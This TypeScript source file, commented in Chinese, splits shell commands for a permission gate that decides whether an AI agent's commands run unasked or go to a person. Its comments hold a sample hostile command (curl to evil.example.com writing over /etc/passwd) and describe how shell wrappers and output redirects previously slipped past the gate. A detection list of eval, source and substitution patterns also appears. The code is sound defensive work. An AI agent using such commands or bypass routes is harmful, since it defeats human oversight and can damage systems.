/**
 * shell 命令的保守切分。
 *
 * 明确不做的事：不展开 `$(...)`、反引号、变量、别名，不解析 `eval` / `source`。
 * 凡是含这些结构的命令一律标 `unparseable`，由 decide() 判 escalate。
 * **解析不了的东西绝不自动放行**——这是本模块唯一重要的安全性质。
 */

export interface Segment {
  /** 已去引号的 argv */
  argv: readonly string[]
  program: string
  flags: readonly string[]
  /** 非 flag 的位置参数 */
  operands: readonly string[]
  /**
   * 重定向写到哪儿去（`> f`、`>> f`、`2> f`、`&> f`）。
   *
   * **这是 shell 里最常见的写文件方式，而它和程序名无关。**
   * 原来只按程序名判断写入语义（cp/mv/tee…），于是
   * `echo ok > /tmp/x` 这种在「自动编辑」档下一路放行——
   * 而那一档在界面上写的是「工作区内的改动直接放行，越界才问」。
   * 实测就是这么把 `/tmp` 里的文件写出来的，一次都没问。
   */
  redirects: readonly string[]
}

export interface SplitResult {
  segments: readonly Segment[]
  unparseable: boolean
  /** unparseable 时说明原因，会进 Verdict.reason */
  reason?: string
}

/** 会改变「实际执行什么」的结构——出现即放弃解析。 */
const OPAQUE_PATTERNS: readonly (readonly [RegExp, string])[] = [
  [/\$\(/, "命令替换 $(...)"],
  [/`/, "反引号命令替换"],
  [/(^|\s)eval(\s|$)/, "eval"],
  [/(^|\s)source(\s|$)/, "source"],
  [/(^|\s)\.\s+\S/, "点号 source"],
  [/(^|\s)exec(\s|$)/, "exec 替换进程"],
  [/<\(/, "进程替换 <(...)"],
]

const SEPARATOR = /(?:&&|\|\||;|\||\n)/

/**
 * shell 包壳：`/bin/zsh -lc '真正的命令'`。
 *
 * **不剥掉的话判定器是瞎的。** codex 把每一条命令都包成这个形状，
 * 于是分词器只看到 `["/bin/zsh", "-lc", "真正的命令整串"]`：
 *
 * - 签名变成 `/bin/zsh`——勾一次「始终允许」等于放行**今后所有 shell 命令**
 * - `hosts` / `paths` 全空——「写到工作区外」「访问外部网络」这些红线
 *   对 codex 的每一条命令都失明
 *
 * 实测对照（`curl https://evil.example.com -o /etc/passwd`）：
 * 裸命令 → `hosts=["evil.example.com"] paths=["/etc/passwd"] sig=["curl"]`；
 * 包壳后 → `hosts=[] paths=[] sig=["/bin/zsh"]`。
 *
 * 放在这里而不是 codex 驱动里：任何一家用包壳的引擎都会遇到同一个问题，
 * 修在共同的解析入口上才不用每接一家补一次。
 */
const SHELL_WRAPPER = /^\S*(?:^|\/)?(?:sh|bash|zsh|dash|ksh)\s+-[a-z]*c\s+(['"])([\s\S]*)\1$/

/** 剥掉一层包壳；不是包壳就原样返回。只剥一层——嵌套包壳本身就该人工看。 */
export function unwrapShell(command: string): string {
  return SHELL_WRAPPER.exec(command.trim())?.[2] ?? command
}

/** 带子命令的程序——签名要带上子命令才有区分度（`git push` vs `git status`）。 */
const SUBCOMMAND_PROGRAMS: ReadonlySet<string> = new Set([
  "git", "npm", "pnpm", "yarn", "bun", "cargo", "go", "docker", "kubectl",
  "brew", "pip", "pip3", "uv", "gh", "systemctl", "launchctl",
])

function tokenize(text: string): string[] {
  const tokens: string[] = []
  const matcher = /"([^"]*)"|'([^']*)'|(\S+)/g
  for (const m of text.matchAll(matcher)) {
    tokens.push(m[1] ?? m[2] ?? m[3] ?? "")
  }
  return tokens.filter((t) => t !== "")
}

/**
 * `>`、`>>`、`2>`、`&>` 后面跟的那个目标。
 *
 * 只认**写**的重定向：`<` 是读，`>&1` / `>&2` 是复制文件描述符不是文件。
 * 认得出多少算多少——真正兜底的是 `OPAQUE_PATTERNS`（含 `$()`、`eval` 一律
 * 判为「无法静态判定」去问人）。这里做的是**把最常见的那一种从漏网里捞回来**。
 */
const REDIRECT = /(?:^|\s)(?:\d*|&)?>>?\s*("[^"]+"|'[^']+'|[^\s;|&<>]+)/g

export function redirectTargets(text: string): readonly string[] {
  const out: string[] = []
  for (const hit of text.matchAll(REDIRECT)) {
    const raw = hit[1]
    if (raw === undefined) continue
    const target = raw.replace(/^["']|["']$/g, "")
    // `>&1`、`>/dev/null` 不是要保护的东西
    if (target.startsWith("&") || target === "/dev/null" || target === "/dev/stderr") continue
    out.push(target)
  }
  return out
}

function toSegment(text: string): Segment | undefined {
  const argv = tokenize(text.trim())
  const program = argv[0]
  if (program === undefined) return undefined
  return {
    argv,
    program,
    flags: argv.filter((a) => a.startsWith("-")),
    operands: argv.slice(1).filter((a) => !a.startsWith("-")),
    redirects: redirectTargets(text),
  }
}

export function splitSegments(raw: string): SplitResult {
  // 先剥壳再判：包在 `zsh -lc '...'` 里的 `$(...)` 也必须被认出来
  const command = unwrapShell(raw)
  for (const [pattern, label] of OPAQUE_PATTERNS) {
    if (pattern.test(command)) {
      return { segments: [], unparseable: true, reason: `命令含${label}，无法静态判定` }
    }
  }
  const segments = command
    .split(SEPARATOR)
    .map(toSegment)
    .filter((s): s is Segment => s !== undefined)

  if (segments.length === 0) {
    return { segments: [], unparseable: true, reason: "命令为空或无法切分" }
  }
  return { segments, unparseable: false }
}

/** 归一签名，供记忆规则做模式匹配。`pnpm run test -- --watch` → `pnpm run`。 */
export function signature(segment: Segment): string {
  if (!SUBCOMMAND_PROGRAMS.has(segment.program)) return segment.program
  const sub = segment.operands[0]
  return sub === undefined ? segment.program : `${segment.program} ${sub}`
}

/** 该 segment 是否带了任一 flag（同时匹配短横线与双横线写法）。 */
export function hasFlag(segment: Segment, ...names: readonly string[]): boolean {
  return segment.flags.some((flag) =>
    names.some((name) => flag === name || (flag.startsWith("-") && !flag.startsWith("--") && name.length === 2 && flag.includes(name.slice(1)))),
  )
}
